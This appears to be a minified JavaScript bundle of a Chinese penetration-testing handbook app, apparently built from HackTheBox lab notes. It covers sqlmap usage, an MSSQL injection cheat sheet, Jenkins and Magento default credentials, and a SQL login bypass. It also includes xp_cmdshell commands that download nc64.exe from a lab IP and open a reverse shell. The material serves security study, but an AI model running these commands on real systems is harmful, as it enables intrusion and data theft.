              `),Bu={name:"\u3010SQL\u3011_\u624B\u518C",steps:[{name:"\u3010mysql\u3011 \u3010\u547D\u4EE4\u884C\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
          \u767B\u5F55
              mysql  -h  <\u4E3B\u673A\u5730\u5740>  -u  <\u7528\u6237\u540D>  \uFF0Dp <\u7528\u6237\u5BC6\u7801>
                  1

              mysql  -h  <\u4E3B\u673A\u5730\u5740>  -u  <\u7528\u6237\u540D>  \uFF0Dp <\u7528\u6237\u5BC6\u7801>  -P  <\u7AEF\u53E3>
                  \u300A-P\u300B\uFF0C\u6307\u5B9A\u7AEF\u53E3

          \u8D26\u53F7\u5BC6\u7801
              \u300Aroot\u300B\u8D26\u6237\uFF0C\u65E0\u9700\u5BC6\u7801


          \u8FDB\u5165\u4E4B\u540E\uFF0C\u5E38\u89C1\u547D\u4EE4
              \u67E5\u770B\u6570\u636E\u5E93
                  show databases;

              \u9009\u7528\u4E00\u4E2A\u6570\u636E
                  use <\u6570\u636E\u5E93\u540D\u79F0>;

              \u67E5\u770B\u6570\u636E\u8868
                  show tables;

              \u67E5\u770B\u8868\u7ED3\u6784
                  describe <\u8868\u540D\u79F0>;

          `))},{name:"\u3010sqlmap\u3011",desc:n.a.createElement(n.a.Fragment,null),steps:[{name:"\u642D\u5EFA",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("		1.\u3010sqlmap --update\u3011\uFF0C\u5347\u7EA7\u3002"))},{name:"\u57FA\u672C\u4F7F\u7528",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              \u3010sqlmap\u3011\u547D\u4EE4\uFF0C\u53EF\u4EE5\u7528\u3010python3  /usr/bin/sqlmap\u3011\u66FF\u4EE3

              GET\u53C2\u6570

                  sqlmap  -u  <\u63A5\u53E3url>
`,`
              POST\u53C2\u6570
                `,n.a.createElement(n.a.Fragment,null,"\uFF08",nn("\u8D44\u65991","https://blog.csdn.net/u011781521/article/details/58594941"),"\uFF09"),`
                  1.\u5148\u5C06\u3010\u8BF7\u6C42\u3011\u4FDD\u5B58\u4E3A\u3010HTTP\u62A5\u6587\u6587\u4EF6\u3011\uFF0C\u518D\u7528\u3010-r\u3011\u9009\u9879 \u52A0\u8F7D\u6587\u4EF6 \uFF0C\u5373\u53EF\u3002
                      1.\u89C1\u3010\u5E38\u89C1\u9009\u9879\u3011\u2014\u2014\u3010 -r\u9009\u9879 \u3011\u3002

                  2.\u793A\u4F8B\uFF1A
                      sqlmap  -r  sql-data.txt
                `,`

              Cookie\u53C2\u6570
                  \u8D44\u6599\uFF1A
                      https://superuser.com/a/1167937/1115713

                  sqlmap  -u  <\u63A5\u53E3url>  --cookie="cookie\u6587\u672C\u5BF9"  --level  2
                      1.\u8981\u6C42\u3010--level\u3011>=2

              \u4E4B\u540E\u4F1A\u8BE2\u95EE\u7684\u4E00\u4E9B\u95EE\u9898\uFF1A
                  1.\u53D1\u73B0\u662F xxx \u6570\u636E\u5E93\u8F6F\u4EF6\uFF0C\u662F\u5426\u8DF3\u8FC7 \u5176\u5B83\u6570\u636E\u5E93\u8F6F\u4EF6 \u7684\u5C1D\u8BD5\uFF1F
                  2.\u5BF9\u4E8E\u63A5\u4E0B\u6765\u7684\u5C1D\u8BD5\uFF0C\u662F\u5426\u5305\u62EC\u3010\u6240\u6709\u5C1D\u8BD5\u3011\uFF1F  \uFF08\u6839\u636E\u73B0\u6709\u7EA7\u522B\u548C\u98CE\u9669\uFF09
                  3.\u67D0\u4E2A \u53C2\u6570 \u53D1\u73B0\u98CE\u9669\uFF0C\u662F\u5426\u8FD8 \u7EE7\u7EED\u5C1D\u8BD5 \u5176\u5B83\u53C2\u6570\uFF1F

              \u6700\u540E\uFF0C\u4F1A\u5217\u51FA\u5404\u4E2A\u3010\u6CE8\u5165\u70B9\u3011\u6765\uFF1A
                  1.\u4F1A\u4FDD\u5B58\u5728\u3010.sqlmap/output/\u5730\u5740/log\u3011\u91CC\u9762\u3002
                  2.\u8981\u7D20\uFF1A
                      1.\u3010Type\u3011\uFF0C\u57FA\u672C\u7C7B\u578B
                      2.\u3010Title\u3011\uFF0C\u6CE8\u5165\u70B9\u7684\u5177\u4F53\u6807\u9898
                      3.\u3010Payload\u3011\uFF0C\u5177\u4F53\u653B\u51FB\u8D1F\u8F7D\uFF08\u4EE3\u7801\uFF09

              `))},{name:"\u5DE5\u5177\u8FDE\u63A5Shell",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,Ku)},{name:"\u300A\u81EA\u52A8\u641C\u7D22\u300B\u8868\u5355\uFF0C\u8FDB\u884C\u6CE8\u5165",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("	\u3010\u81EA\u52A8\u641C\u7D22\u3011\u8868\u5355\uFF0C\u8FDB\u884C\u6CE8\u5165\uFF1A","		1.\u3010sqlmap  -u  <url\u5730\u5740>  --forms\u3011"," "))},{name:"\u5E38\u89C1\u9009\u9879",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(n.a.createElement(n.a.Fragment,null,"	","\u5E38\u89C1\u9009\u9879\uFF1A \uFF08",nn("\u8D44\u65991","https://zhuanlan.zhihu.com/p/148043191"),"\u3001",nn("\u5B98\u65B9\u9009\u9879\u6587\u68631","https://github.com/sqlmapproject/sqlmap/wiki/Usage"),"\uFF09"),`

                4.\u3010-p\u3011\uFF0C\u6307\u5B9A\u9700\u8981\u6D4B\u8BD5\u7684\u63A5\u53E3\u53C2\u6570\u540D\u3002 \uFF08\u5982\u679C\u4E0D\u8BBE\u7F6E\uFF0C\u9ED8\u8BA4\u662F\u6240\u6709\u3002\uFF09
                    1.\u53EF\u591A\u4E2A\uFF0C\u7528\u9017\u53F7\u5206\u9694
                    2.\u3010-p 'arg_1,arg_2' \u3011

                5.\u3010--param-filter\u3011
                    \u8FC7\u6EE4

                5.\u3010-dbs\u3011\uFF0C\u5F53\u53D1\u73B0\uFF0C\u6709\u6743\u9650\u8BFB\u53D6\u6570\u636E\u5E93\u7684\u8868\u65F6\uFF0C\u5C1D\u8BD5\u5217\u51FA\u6240\u6709\u7684\u3010\u8868\u3011\u3002
                    1.\u56FD\u5185\u6D4B\u8BD5\uFF0C\u4F1A\u6709\u70B9\u5371\u9669

                6.\u3010-v\u3011\uFF0C\u8BBE\u7F6E\u65E5\u5FD7\u7B49\u7EA7(0-6)\uFF0C\u8D8A\u9AD8\u8D8A\u8BE6\u7EC6\u3002\u9ED8\u8BA4\u4E3A 1 \u3002
                    1.\u4E2A\u522B\u60C5\u51B5\u4E0B\uFF0C\u9700\u8981\u63D0\u9AD8\u7B49\u7EA7\uFF0C\u67E5\u770B\u62A5\u9519\u4FE1\u606F\u3002

                7.\u3010--level\u3011\uFF0C\u8C03\u6574 payload \u7684\u4E30\u5BCC\u6027(1-5)\uFF0C\u8D8A\u9AD8\u8D8A\u4E30\u5BCC\u3002\u9ED8\u8BA4\u4E3A 1 \u3002
                    1.\u5B58\u5728\u4E00\u5B9A\u98CE\u9669
                    2.\u6D4B\u8BD5\u3010Cookie\u3011\u8981\u6C42\u3010level\u3011>=2 \u3002

                8.\u3010--rsk\u3011\uFF0C\u8C03\u6574 \u6CE8\u5165 \u7684\u5192\u9669\u7B49\u7EA7(1-3)\uFF0C\u8D8A\u9AD8\u5C1D\u8BD5\u7684\u53EF\u80FD\u6027\u8D8A\u591A\u3002\u9ED8\u8BA4\u4E3A 1 \u3002
                    1.\u5B58\u5728\u4E00\u5B9A\u98CE\u9669


                3.\u3010-r\u3011\uFF0C\u8BFB\u53D6\u52A0\u8F7D\u3010\u4E00\u4E2A\u6587\u4EF6\u3011\uFF0C\u4F5C\u4E3A\u6D4B\u8BD5\u7684\u63A5\u53E3\u6570\u636E

                    1. \u52A0\u8F7D\u7684\u6587\u4EF6\uFF0C\u662F\u4E00\u4E2A\u3010\u5B8C\u6574HTTP\u62A5\u6587\u3011\u6587\u4EF6\u3002
                    2. \u4FDD\u5B58\u65B9\u5F0F\uFF1A
                        1. BurpSuite
                            1. \u914D\u5408 BurpSuite \u7684\u3010Raw\u2014\u2014Copy to file\u3011\u4F7F\u7528\uFF0C\u53EF\u4EE5\u6781\u5927\u52A0\u901F\u3002
                        2. \u6D4F\u89C8\u5668\u624B\u52A8\u64CD\u4F5C
                            1. \u5148\u590D\u5236\u3010Request Header\u3011
                            2. \u518D\u590D\u5236\u3010Raw Post Data\u3011
                    3. \u5FC5\u987B\u8981\u6CE8\u610F\u3010\u8BF7\u6C42Method\u6570\u636E\u7C7B\u578B\u3011
                        1.\u3010GET\u3011
                            \u3010query\u53C2\u6570\u3011
                            \u3010path\u8DEF\u5F84\u3011
                        2.\u3010POST\u3011\uFF0C
                            \u3010form-data\u3011\u5F62\u5F0F
                                1.\u3010boundary-------\u865A\u7EBF\u6570\u5B57\u3011\u5206\u9694\u5F00\u7684\u3002
                            \u3010raw / json\u3011\u5F62\u5F0F
                                1.\u3010application/json\u3011\u5F62\u5F0F\u7684JSON
                                2.\u3010application/x-www-form-urlencoded\u3011\u5F62\u5F0F\u7684JSON
                                3.\u3010application/json\u3011\u5F62\u5F0F\u7684urlencoded\u8FDE\u5B57\u4E32
                                4.\u3010application/x-www-form-urlencoded\u3011\u5F62\u5F0F\u7684urlencoded\u8FDE\u5B57\u4E32
                            \u3010binary\u3011\u5F62\u5F0F
                        3.\u3010Cookie\u3011\u6570\u636E
                        4.\u3010Headers\u3011\u6570\u636E



                1.\u3010--cookie\u3011 \u5982\u679C\u63A5\u53E3\u4F7F\u7528\u4E86cookie\uFF0C\u5219\u4F20\u5165\u8FD9\u4E2A


                2.\u3010--os-shell\u3011\uFF0C\u5C1D\u8BD5\u8FDE\u63A5 \u7CFB\u7EDFshell

                `))},{name:"\u6570\u636E\u9636\u6BB5\u9009\u9879    \u3010\u7206\u6570\u636E\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("	\u6570\u636E\u9636\u6BB5\u9009\u9879\uFF1A|","		1.\u3010-D  <\u6570\u636E\u5E93\u540D\u79F0>  --tables  \u3011\uFF0C\u5728 \u6570\u636E\u5E93 \u4E2D \u731C\u8868","		2.\u3010-D  <\u6570\u636E\u5E93\u540D\u79F0>  -T  <\u8868\u540D>  --columns  \u3011\uFF0C\u5728 \u8868 \u4E2D \u731C\u5217",'		3.\u3010-D  <\u6570\u636E\u5E93\u540D\u79F0>  -T  <\u8868\u540D>  -C  "<\u5217\u540D\u591A\u4E2A\u7528\u9017\u53F7\u5206\u9694>"  --dump  \u3011\uFF0C\u5728 \u5217 \u4E2D \u731C\u6570\u636E',"		1.\u3010\u6D41\u7A0B\u3011","			\u7206\u5E93\uFF1A    \u3010-u  <url>  --dbs\u3011","			\u7206\u8868\uFF1A    \u3010-u  <url>  -D  <\u5E93\u540D>  --tables  --batch  --threads 10\u3011","			\u7206\u5B57\u6BB5\uFF1A  \u3010-u  <url>  -D  <\u5E93\u540D>  -T  <\u8868\u540D>  --columns  --batch  --threads 10\u3011","			\u7206\u503C\uFF1A    \u3010-u  <url>  -D  <\u5E93\u540D>  -T  <\u8868\u540D>   -C  <\u5217\u540D\uFF0C\u53EF\u591A\u4E2A\uFF0C\u9017\u53F7\u5206\u9694>  --dump  --batch  --threads 10\u3011"))}]},{name:"\u3010mssql\u3011 / \u3010sqlserver\u3011\u539F\u751F",desc:n.a.createElement(n.a.Fragment,null),steps:[{name:"\u5E38\u89C1\u547D\u4EE4",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


          \u8D44\u6599\uFF1Ahttps://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
              \u6CE8\u610F\uFF0C\u5728\u8FD9\u4E2A\u6587\u6863\u4E2D \u6240\u6709\u3010\u2014\u3011\u90FD\u66FF\u6362\u4E3A\u3010--\u3011


          \u547D\u4EE4\u6267\u884C
              \u6267\u884Ccmd\u547D\u4EE4\uFF1A
                  EXEC xp_cmdshell \u2018net user\u2019;                  -- privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it\u2019s disabled by default:

              \u8BBE\u7F6E\uFF1A
                  \u5217\u4E3E\u8BBE\u7F6E\uFF1A
                      EXEC sp_configure;                            -- priv

                  \u67E5\u770B\u5355\u4E2A\u8BBE\u7F6E\uFF1A
                      EXEC sp_configure \u2018show advanced options\u2019;    -- priv

                  \u8FDB\u884C\u5355\u4E2A\u8BBE\u7F6E\uFF1A\uFF08\u540E\u7EED\u9700\u8981 RECONFIGURE \u624D\u80FD\u751F\u6548\uFF09
                      EXEC sp_configure \u2018show advanced options\u2019, 1; -- priv

                  \u4F7F\u3010\u914D\u7F6E\u3011\u9A6C\u4E0A\u751F\u6548\uFF1A
                      RECONFIGURE;

              RECONFIGURE;                                  -- priv
              EXEC sp_configure \u2018xp_cmdshell\u2019, 1;           -- priv
              RECONFIGURE;                                  -- priv



          \u67E5\u770B\u3010\u7248\u672C\u3011
              SELECT @@version

          \u6CE8\u91CA
              \u3010--\u3011
              \u3010/*comment*/\u3011

          \u5F53\u524D\u3010\u7528\u6237\u3011
              SELECT user_name();
              SELECT system_user;
              SELECT user;
              SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID ;

          \u5217\u4E3E\u3010\u7528\u6237\u3011
              SELECT name FROM master..syslogins ;

          \u5217\u4E3E\u3010\u5BC6\u7801Hash\u3011
              SELECT name, password FROM master..sysxlogins -- priv, mssql 2000;
                  \u9700\u8981\u3010members of sysadmins\u3011\u624D\u80FD\u8BBF\u95EE\u3010sysxlogins\u3011\u3002\u6CE8\u610F\u8FD9\u70B9\u3002

              \u4EE5\u53CA\u53E6\u5916 3 \u6761\u3002

          \u5BC6\u7801\u7834\u89E3
              MSSQL 2000 \u548C 2005 Hashes \u90FD\u662F\u57FA\u4E8E\u3010SHA1-based\u3011
              phrasen|drescher \u80FD\u591F\u7834\u89E3\u4ED6\u4EEC\u3002

          \u68C0\u67E5\u3010\u7528\u6237\u6743\u9650\u3011
              SELECT is_srvrolemember('sysadmin');        -- \u662F\u5426\u3010sysadmin\u3011\u8EAB\u4EFD

          \u5217\u4E3E\u3010\u6743\u9650\u3011
              SELECT permission_name FROM master..fn_my_permissions(null, \u2018DATABASE\u2019);              -- current database
              SELECT permission_name FROM master..fn_my_permissions(null, \u2018SERVER\u2019);                -- current server
              SELECT permission_name FROM master..fn_my_permissions(\u2018master..syslogins\u2019, \u2018OBJECT\u2019); -- permissions on a table
              SELECT permission_name FROM master..fn_my_permissions(\u2018sa\u2019, \u2018USER\u2019);

              \u4EE5\u53CA\u53E6\u5916 8 \u6761\u3002

              \u4EE5\u53CA\u53E6\u5916 12 \u6761\u3002

          \u5217\u4E3E\u3010DBA\u8D26\u6237\u3011 Database Admin \u6570\u636E\u5E93\u7BA1\u7406\u5458

          \u5F53\u524D\u3010\u6570\u636E\u5E93\u3011
              SELECT DB_NAME()

          \u5217\u4E3E\u3010\u6570\u636E\u5E93\u3011
              SELECT name FROM master..sysdatabases;
              SELECT DB_NAME(N); -- for N = 0, 1, 2, \u2026

          \u5217\u4E3E\u3010\u5217\u3011

          \u5217\u4E3E\u3010\u8868\u3011

          \u4ECE\u3010\u8868\u3011\u4E2D\u627E\u51FA\u3010\u5217\u540D\u3011

          \u9009\u62E9\u3010\u7B2CN\u884C\u3011

          \u9009\u62E9\u3010\u7B2CN\u4E2A\u5B57\u7B26\u3011

          \u4F4D\u4E0E Bitwise AND

          \u3010ASCII\u503C\u3011\u5230\u3010\u5B57\u7B26\u3011

          \u3010\u5B57\u7B26\u3011\u5230\u3010ASCII\u503C\u3011

          \u8F6C\u5316 Casting

          \u3010\u5B57\u7B26\u4E32\u3011\u62FC\u63A5\u3001\u7EA7\u8054

          \u3010If\u3011\u8868\u8FBE\u5F0F

          \u3010Case\u3011\u8868\u8FBE\u5F0F

          \u907F\u514D\u3010\u5F15\u53F7\u3011 Avoiding Quotes

          \u3010\u65F6\u95F4\u5EF6\u8FDF\u3011 Time Delay

          \u53D1\u9001\u3010DNS\u3011\u8BF7\u6C42



          \u672C\u5730\u6587\u4EF6\u8BBF\u95EE Local File Access

          \u4E3B\u673A\u540D\u3001IP\u5730\u5740\uFF0CHostname  IP

          \u521B\u5EFA\u3010\u7528\u6237\u3011

          \u5220\u9664\u3010\u7528\u6237\u3011    Drop Users

          \u8BBE\u7F6E\u3010DBA\u7528\u6237\u3011 Make User DBA

          \u3010\u6570\u636E\u5E93\u6587\u4EF6\u3011\u4F4D\u7F6E       Location of DB files

          \u3010\u9ED8\u8BA4\u6570\u636E\u5E93/\u7CFB\u7EDF\u6570\u636E\u5E93\u3011 Default/System Databases



          `))},{name:"\u4E00\u4E9B\u5B9E\u6218\u793A\u4F8B",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

  xp_cmdshell  "powershell  -c  cd  C:\\Users\\sql_svc\\Downloads;  wget  http://10.10.14.56:8080/nc64.exe  -outfile  nc64.exe  "
      \u3010IP\u5730\u5740\u3011\uFF0C\u662F\u3010ifconfig\u3011\u7684\u3010tun0\u63A5\u53E3\u3011\u7684 IP \u3002


  xp_cmdshell  "powershell  -c  cd  C:\\Users\\sql_svc\\Downloads;  .\\nc64.exe  -e  cmd.exe  10.10.14.56  443  "
      \u3010IP\u5730\u5740\u3011\uFF0C\u540C\u4E0A\u3002

              `))}]},{name:"\u3010mssqlclient\u3011 / \u3010mssqlclient.py\u3011",desc:n.a.createElement(n.a.Fragment,null),content:Promise.all([Promise.resolve().then(f.bind(null,"2jYT"))]).then(function(sn){var mn=Object(E.a)(sn,1),Cn=mn[0];return n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(Cn.Impacket_\u5957\u4EF6_Helper["mssqlclient.py"]))})},{name:"\u3010PostgreSQL\u3011\u539F\u751F",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`



          `))},{name:"\u3010Mongo\u3011/\u3010MongoDB\u3011\u539F\u751F",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              mongo

                  MongoDB \u662F\u4E00\u4E2A\u6E90\u4EE3\u7801\u53EF\u7528\u7684\u8DE8\u5E73\u53F0\u9762\u5411\u6587\u6863\u7684\u6570\u636E\u5E93\u7A0B\u5E8F\u3002
                  MongoDB \u88AB\u5F52\u7C7B\u4E3A NoSQL \u6570\u636E\u5E93\u7A0B\u5E8F\uFF0C\u5B83\u4F7F\u7528\u5E26\u6709\u53EF\u9009\u6A21\u5F0F\u7684\u7C7B\u4F3C JSON \u7684\u6587\u6863\u3002


              \u767B\u5F55

                      \u3010\u6570\u636E\u5E93\u540D\u3011\uFF0C\u5728\u3010UniFi Network\u3011\u4E2D\u9ED8\u8BA4\u662F\u3010ace\u3011


              \u6267\u884C

                  \u9996\u5148\uFF0C\u53EF\u4EE5\u53C2\u7167\u3010\u6211\u7684\u7B14\u8BB0\u3011\u4E2D\uFF0Cmongo\u7684\u6B63\u786E\u67E5\u8BE2

                  \u67E5\u770B\u4FE1\u606F\uFF1A
                      mongo  <\u6570\u636E\u5E93\u540D>  --port  27117  --eval  "db.admin.find().forEach(printjson);"

                  \u4FEE\u6539\u4FE1\u606F\uFF1A
                      mongo  <\u6570\u636E\u5E93\u540D>  --port  27117  --eval  'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"<\u521A\u521A\u751F\u6210\u7684hash\u503C>"}})'


              \u5E38\u89C1\u9009\u9879

                  \u3010--port\u3011\uFF0C\u6307\u5B9A\u7AEF\u53E3

                  \u3010--eval\u3011\uFF0C\u6267\u884C\u547D\u4EE4


          `))},{name:"\u540E\u7EED\u5229\u7528",desc:n.a.createElement(n.a.Fragment,null),steps:[{name:"\u83B7\u5F97shell",desc:n.a.createElement(n.a.Fragment,null),content:Promise.all([Promise.resolve().then(f.bind(null,"2jYT"))]).then(function(sn){var mn=Object(E.a)(sn,1),Cn=mn[0];return n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(u.g.\u7EC4\u4EF6\u624B\u518C.get\u6309\u94AE\u548C\u5F39\u51FA\u624B\u518C_\u6709\u65E0cfg\u7686\u53EF(Cn.Shell_ReverseShell_\u53CD\u5411\u4EE3\u7406_\u624B\u518C)),u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


              \u7528sqlmap\uFF0C\u83B7\u53D6\u3010os-shell\u3011


                    `,Ku))})},{name:"\u3010\u4E07\u80FD\u5BC6\u7801\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              \u5E26\u6CE8\u91CA
                  \u3010' #\u3011
                  \u3010' ---\u3011

              \u6216\u6761\u4EF6
                  \u3010' or 1=1\u3011

              `))},{name:"\u4E0A\u4F20\u6587\u4EF6",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E())},{name:"\u62D6\u53D6\u4FE1\u606F",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E())},{name:"\u6267\u884C\u547D\u4EE4",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E())}]}]},Au=Bu,wu=k.e.singleATag_blank,yu={name:"\u3010BurpSuite\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4F7F\u7528",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u57FA\u672C\u529F\u80FD

              \u62E6\u622A          \u3010Proxy\u3011

              \u7F16\u7801/\u89E3\u7801      \u3010Decoder\u3011
                  \u5176\u5B9E\uFF0C\u65E2\u53EF\u4EE5Encode\uFF0C\u4E5F\u53EF\u4EE5Decode\u3002
                      Encode as
                          \u4E0D\u540C\u7684\u989C\u8272\uFF0C\u5373\u53EF\u3002


              \u91CD\u590D\u8BF7\u6C42        \u3010Repeater\u3011
                  \u53F3\u4FA7\uFF0C\u65B9\u4FBF\u7F16\u7801

          `))}]},Gu=yu,tn=f("4MH1"),vn=k.e.singleATag_blank,On={name:"\u3010Jenkins\u3011_\u624B\u518C",steps:[{name:"\u767B\u5F55",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u9ED8\u8BA4\u8D26\u53F7\u5BC6\u7801 \u3001 credentials\u51ED\u8BC1
              \u53C2\u8003\u8D44\u6599\uFF1A
                  \u9ED8\u8BA4\u8D26\u53F7\u5BC6\u78011\uFF1Ahttps://www.login-faq.com/jenkins-default-username-and-password/
                  \u9ED8\u8BA4\u8D26\u53F7\u5BC6\u78012\uFF1Ahttps://www.login-faq.com/jenkins-default-username-and-password/#2
                  \u9ED8\u8BA4\u8D26\u53F7\u5BC6\u78013\uFF1Ahttps://treehozz.com/what-is-the-default-jenkins-password
                  \u9ED8\u8BA4\u8D26\u53F7\u5BC6\u78014\uFF1Ahttps://docs.openshift.com/container-platform/3.3/using_images/other_images/jenkins.html

              \u7F51\u4E0A\u666E\u904D\u7ED9\u51FA\u7684\uFF1A
                  admin/password

              HTB\u7ED9\u51FA\u7684\uFF1A
                  admin:password
                  admin:admin
                  root:root
                  root:password
                  admin:admin1
                  admin:password1
                  root:password1

          `))},{name:"\u5E38\u89C1\u3010\u5229\u7528\u6D41\u7A0B\u3011\u7684\u793A\u4F8B\uFF0C\u4F9B\u53C2\u8003",desc:n.a.createElement(n.a.Fragment,null),content:Promise.all([Promise.resolve().then(f.bind(null,"2jYT"))]).then(function(sn){var mn=Object(E.a)(sn,1),Cn=mn[0];return n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u793A\u4F8B\u7B2C\u4E00\u79CD\uFF1A
              gquere/pwn_jenkins\uFF1A\u5173\u4E8E\u653B\u51FB Jenkins \u670D\u52A1\u5668\u7684\u6CE8\u610F\u4E8B\u9879
                  https://github.com/gquere/pwn_jenkins

          \u793A\u4F8B\u7B2C\u4E8C\u79CD\uFF1A
          `,tn.a.Jenkins,`


          \u793A\u4F8B\u7B2C\u4E09\u79CD\uFF1A
              Jenkins - Pentest Book
                  https://pentestbook.six2dez.com/enumeration/webservices/jenkins
`,`
          \u6210\u719F\u65B9\u6848\uFF1A
              \u4F7F\u7528\u3010Groovy Script\u3011\uFF0C\u5728\u3010Script Console\u3011\u4E2D
                  \u4F7F\u7528\u573A\u666F\uFF1A
                      (\u539F\u672C)\u5E38\u7528\u4E8E\uFF0C\u3010\u6545\u969C\u8C03\u8BD5\u3011\u548C\u3010\u6545\u969C\u8BCA\u65AD\u3011

`,u.g.\u7EC4\u4EF6\u624B\u518C.get\u6309\u94AE\u548C\u5F39\u51FA\u624B\u518C_\u6709\u65E0cfg\u7686\u53EF(Cn.Shell_ReverseShell_\u53CD\u5411\u4EE3\u7406_\u624B\u518C),`
          \u96F6\u788E\uFF1A
              \u5229\u7528 Groovy \uFF0C\u5B9E\u73B0 RCE
                  \u8D44\u6599\uFF1Ahttps://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html

            `,`
          \u5982\u679C\u662FLinux\uFF0C\u53EF\u80FD\u8981\u5C06\u3010cmd\u3011\u6539\u6210\u3010/bin/bash\u3011\u3002
                `))})}]},zn=On,Sn=k.e.singleATag_blank,qn={name:"\u3010CMS\u3011_\u624B\u518C",steps:[{name:"\u3010Magento\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u767B\u5F55\u5BC6\u7801\uFF1A

              \u9ED8\u8BA4\u8D26\u53F7\u5BC6\u7801\uFF1A
                  admin/123123

              \u5F3A\u5EA6\u8981\u6C42\uFF1A
                  \u5BC6\u7801\u81F3\u5C117\u4E2A\u5B57\u7B26
                  \u5305\u542B\u5B57\u6BCD\u548C\u6570\u5B57

              \u5BC6\u7801\u7206\u7834\u601D\u8DEF
                  \u53EF\u4EE5\u4ECE\u3010\u8BCD\u5178\u5B50\u6A21\u5757\u2014\u2014\u9AD8\u9891\u5F31\u5BC6\u7801\u3011\u4E2D\uFF0C\u627E\u7B26\u5408\u3010\u5F3A\u5EA6\u8981\u6C42\u3011\u7684\u3002

          `))},{name:"\u3010UniFi\u3011 / \u3010UniFi Network\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u7531 Ubiquiti Networks \u5F00\u53D1
              \u7528\u4E8E\u5E2E\u52A9\u8BBE\u7F6E\u548C\u7BA1\u7406 UniFi Network \u8BBE\u5907\uFF0C\u4EE5\u53CA\u5BF9\u7F51\u7EDC\u6D41\u91CF\u3001\u5B89\u5168\u6027\u548C\u65E0\u7EBF\u6027\u80FD\u8FDB\u884C\u5168\u9762\u76D1\u7763\u548C\u63A7\u5236

          CVE\u5206\u6790\uFF1A
